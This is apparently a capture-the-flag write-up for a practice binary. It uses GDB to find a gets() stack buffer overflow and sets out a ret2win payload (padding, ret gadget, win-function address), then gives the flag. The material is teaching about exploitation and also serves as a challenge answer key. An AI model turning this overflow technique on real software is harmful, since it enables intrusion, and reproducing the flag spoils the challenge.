# Samus Stack Smash

## Description

A Federation checkpoint AI loops the same authorization prompt while a damaged Chozo console hums behind it. Push past the guard and see what the access vault is hiding.

## Solution Walkthrough

### Step 1: Analyze `main`

First, use GDB to examine the structure of `chall`, starting by disassembling `main`:

```text
0x000000000040136b <+38>:    call   0x4012d8 <vuln>
```

There is no significant logic inside `main`; it mainly calls `vuln`, so we proceed directly to analyze `vuln`.

---

### Step 2: Identify the vulnerability

After analyzing `vuln`, we can see that the program allocates a 32-byte buffer, but uses `gets()` to read data into it:

```text
0x0000000000401316 <+62>:    lea    -0x20(%rbp),%rax
0x000000000040131a <+66>:    mov    %rax,%rdi
0x000000000040131d <+69>:    mov    $0x0,%eax
0x0000000000401322 <+74>:    call   0x4010f0 <gets@plt>
```

In other words, a stack buffer overflow exists here.

Additionally, this challenge does not have PIE enabled, so the addresses of internal functions are fixed, allowing for a direct ret2win.

---

### Step 3: Find the win function

Since a ret2win is possible, the next step is to find the function that provides the flag.

Looking at `vuln` again, we only see calls related to output; no suspicious win function is immediately visible:

```text
0x00000000004012ee <+22>:    call   0x4010b0 <puts@plt>
0x00000000004012f3 <+27>:    lea    0xd9e(%rip),%rax        # 0x402098
0x00000000004012fa <+34>:    mov    %rax,%rdi
0x00000000004012fd <+37>:    call   0x4010b0 <puts@plt>
0x0000000000401302 <+42>:    lea    0xdb7(%rip),%rax        # 0x4020c0
0x0000000000401309 <+49>:    mov    %rax,%rdi
0x000000000040130c <+52>:    mov    $0x0,%eax
0x0000000000401311 <+57>:    call   0x4010d0 <printf@plt>
0x0000000000401316 <+62>:    lea    -0x20(%rbp),%rax
0x000000000040131a <+66>:    mov    %rax,%rdi
0x000000000040131d <+69>:    mov    $0x0,%eax
0x0000000000401322 <+74>:    call   0x4010f0 <gets@plt>
0x0000000000401327 <+79>:    lea    -0x20(%rbp),%rax
0x000000000040132b <+83>:    mov    %rax,%rsi
0x000000000040132e <+86>:    lea    0xd8e(%rip),%rax        # 0x4020c3
0x0000000000401335 <+93>:    mov    %rax,%rdi
0x0000000000401338 <+96>:    mov    $0x0,%eax
0x000000000040133d <+101>:   call   0x4010d0 <printf@plt>
```

Therefore, use `strings` to inspect the provided binary:

```text
...
vuln
mission_clear
...
```

A suspicious function named `mission_clear` can be found.

Next, use GDB to check `mission_clear`, and we find its starting address is:

```text
0x401216
```

This is the target function address we need to jump to.

---

### Step 4: Construct the payload

The buffer inside `vuln` is 32 bytes, or `0x20`.

The stack layout is roughly as follows:

```text
buffer[32]
saved rbp[8]
return address[8]
```

Therefore, to overwrite the return address, we first need to fill:

```text
32 bytes buffer + 8 bytes saved rbp = 40 bytes
```

Next, change the return address to the address of `mission_clear`.

The payload structure is as follows:

```text
"A" * 32
+ "B" * 8
+ ret gadget
+ mission_clear
```

The `ret gadget` is included to handle stack alignment, preventing errors that might occur when entering `mission_clear` if the stack is not aligned.

Finally, jumping to `mission_clear` will successfully retrieve the flag.

## Flag

```text
bitctf{{m37r01d_57ack_0v3rrun}}
```
